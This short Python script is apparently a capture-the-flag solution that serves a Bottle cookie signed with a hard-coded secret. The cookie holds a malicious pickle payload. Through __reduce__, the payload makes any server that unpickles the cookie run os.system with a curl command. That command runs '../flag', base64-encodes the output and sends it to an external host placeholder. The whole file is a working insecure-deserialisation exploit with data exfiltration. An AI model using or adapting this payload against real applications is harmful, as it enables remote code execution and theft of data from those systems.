from bottle import route, run, response
import os

class Exploit:
    def __reduce__(self):
        cmd = ("curl https://[外部サーバ]?s=`../flag|base64`")
        return os.system, (cmd,)

@route("/")
def index():
    session = Exploit()
    response.set_cookie("name", session, secret="Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu")
    return "Satoki"

if __name__ == "__main__":
    run(host="0.0.0.0", port=8083)